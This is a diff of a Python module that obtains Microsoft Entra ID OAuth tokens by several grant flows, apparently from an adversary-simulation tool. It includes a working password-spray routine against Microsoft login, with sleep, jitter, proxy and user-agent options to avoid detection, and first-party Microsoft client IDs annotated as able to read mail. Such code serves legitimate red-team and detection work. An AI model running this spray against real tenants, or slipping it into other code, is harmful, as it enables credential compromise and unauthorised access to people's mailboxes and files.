@@ -6,7 +6,6 @@ import random
 def get_ms_token_client(tenant_id, client_id, client_secret, scope):
 
     logging.info("Using client credential OAuth flow to obtain a token")
-
     token_url = f'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token'
 
     token_data = {
@@ -18,14 +17,14 @@ def get_ms_token_client(tenant_id, client_id, client_secret, scope):
 
     response = requests.post(token_url, data=token_data)
 
-    refresh_token = response.json().get('access_token')
+    refresh_token = response.json().get('refresh_token')
     access_token = response.json().get('access_token')
 
-    if refresh_token and access_token:
-        return {'access_token': access_token, 'refresh_token': refresh_token}
+    if access_token:
+        return {'access_token': access_token, 'refresh_token': False}
     else:
         logging.error (f'Error obtaining token. Http response: {response.status_code}')
-        #print (response.text)
+        print (response.text)
 
 
 
@@ -37,13 +36,13 @@ def get_ms_token_username_pass(tenant_id, username, password, scope):
 
     token_url = f'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token'
 
-    full_scope = f'{scope} offline_access'
+    full_scope = f'{scope} offline_access' # required if we want a refresh token
 
     token_data = {
 
         #'client_id': '1950a258-227b-4e31-a9cf-717495945fc2', # Microsoft Azure PowerShell
-        'client_id': '00b41c95-dab0-4487-9791-b9d2c32c80f2',  # Office 365 Management. Works to read emails Graph and EWS.
-        #'client_id': 'd3590ed6-52b3-4102-aeff-aad2292ab01c',  # Microsoft Office. Also works to read emails Graph and EWS.
+        #'client_id': '00b41c95-dab0-4487-9791-b9d2c32c80f2',  # Office 365 Management. Works to read emails Graph and EWS.
+        'client_id': 'd3590ed6-52b3-4102-aeff-aad2292ab01c',  # Microsoft Office. Also works to read emails Graph and EWS.
         #'client_id': '00000002-0000-0ff1-ce00-000000000000', # Office 365 Exchange Online
         #'client_id': '00000006-0000-0ff1-ce00-000000000000', # Microsoft Office 365 Portal
         #'client_id': 'fb78d390-0c51-40cd-8e17-fdbfab77341b', # Microsoft Exchange REST API Based Powershell
@@ -58,15 +57,15 @@ def get_ms_token_username_pass(tenant_id, username, password, scope):
     }
 
     response = requests.post(token_url, data=token_data)
-    #print(response.text)
-    refresh_token = response.json().get('access_token')
+    #print(response.json())
+    refresh_token = response.json().get('refresh_token')
     access_token = response.json().get('access_token')
     
     if refresh_token and access_token:
         return {'access_token': access_token, 'refresh_token': refresh_token}
     else:
         logging.error (f'Error obtaining token. Http response: {response.status_code}')
-        print (response.text)
+        #print (response.text)
 
 
 def get_device_code(tenant_id, client_id, scope):
@@ -81,13 +80,14 @@ def get_device_code(tenant_id, client_id, scope):
     response = requests.post(url, data=data).json()
     return response
 
-def get_ms_token_device_code(tenant_id, scope):
+def get_ms_token_device_code(tenant_id, username , scope):
 
-    logging.info("Using device code OAuth flow to obtain a token")
+    logging.info(f"Using device code OAuth flow to obtain a token for {username}")
 
     #client_id = '00b41c95-dab0-4487-9791-b9d2c32c80f2' # Office 365 Management. Works to read emails Graph and EWS.
-    
     client_id = 'd3590ed6-52b3-4102-aeff-aad2292ab01c' # Microsoft Office. Works for searching one drive files
+    
+
 
     device_code_response = get_device_code(tenant_id, client_id, scope)
 
@@ -98,8 +98,8 @@ def get_ms_token_device_code(tenant_id, scope):
     #print (user_code)
     #print (device_code)
 
-    logging.info(f"Code: "+ user_code)    
-    logging.info(f"Submit the code on the following URL as the simulation user: https://microsoft.com/devicelogin")
+    #logging.info(f"Code: "+ user_code)    
+    logging.info(f"Submit {user_code} at https://microsoft.com/devicelogin for simulated token acquisition")
 
     token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
     token_data = {
@@ -161,8 +161,9 @@ def get_new_token_with_refresh_token(tenant_id, refresh_token, new_scope):
         return {'access_token': new_access_token, 'refresh_token': new_refresh_token}
     else:
         logging.error(f'Error obtaining new access token. HTTP response: {response.status_code}')
+        print(response.json())
 
-
+"""
 def get_ms_token(auth_config, auth_method, scope):
     
     if auth_method == 'resource_owner':
@@ -171,8 +172,22 @@ def get_ms_token(auth_config, auth_method, scope):
         return get_ms_token_device_code(auth_config['tenant_id'], scope)
     elif auth_method == 'client_credentials':
         return get_ms_token_client(auth_config['tenant_id'], auth_config['application_id'], auth_config['client_secret'], scope)
+"""    
+
+def get_ms_token(auth_config, session_details, scope):
     
+    auth_method = session_details.get('type', '') 
+    username = session_details.get('username', '')
+    password  = session_details.get('password', '')
+    app_id = session_details.get('app_id', '')
+    secret = session_details.get('secret', '')
     
+    if auth_method == 'resource_owner':
+        return get_ms_token_username_pass(auth_config['tenant_id'], username, password, scope)
+    elif auth_method == 'device_code':
+        return get_ms_token_device_code(auth_config['tenant_id'], username, scope)
+    elif auth_method == 'client_credentials':
+        return get_ms_token_client(auth_config['tenant_id'], app_id, secret, scope)    
 
 def password_spray(params, sleep=None, jitter=None, user_agent=None, proxy=None):
     
@@ -194,9 +209,11 @@ def password_spray(params, sleep=None, jitter=None, user_agent=None, proxy=None)
     } if proxy else None
 
     # Iterate over each user in the list
-    for user in user_list:
+    #for user in user_list:
+    for index, user in enumerate(user_list):
         body_params = {
             'resource': 'https://graph.windows.net',
+            #'resource': 'https://graph.microsoft.com',
             'client_id': client_id,
             'client_info': '1',
             'grant_type': 'password',
@@ -218,20 +235,21 @@ def password_spray(params, sleep=None, jitter=None, user_agent=None, proxy=None)
         response = requests.post(url, headers=post_headers, data=body_params, proxies=proxies)
         
         if response.status_code == 200:
-            logging.info(f"Password Valid found for {user} : {password}")
+            logging.info(f"Valid credentials found for user '{user}'")
         else:
             #print(response.json())
             error_description = response.json().get('error_description', '')
             error_code = response.json().get('error_codes', '')
             #error_codes = (' '.join(error_code))
             #print(error_description)
-            logging.info(f"Failed authentication attempt user {user} with error {error_code}")
+            logging.error(f"Authentication failed for user '{user}' with error code {error_code}")
 
-        # Apply fixed sleep time or variable sleep time with jitter
-        if sleep is not None:
-            if jitter is not None:
-                time.sleep(sleep + random.uniform(0, jitter))
-            else:
-                time.sleep(sleep)
+        # Apply sleep only if this is not the last auth attempt
+        if index < len(user_list) - 1:
+            if sleep is not None:
+                if jitter is not None:
+                    time.sleep(sleep + random.uniform(0, jitter))
+                else:
+                    time.sleep(sleep)                
 
     logging.info("Password spray attack completed")
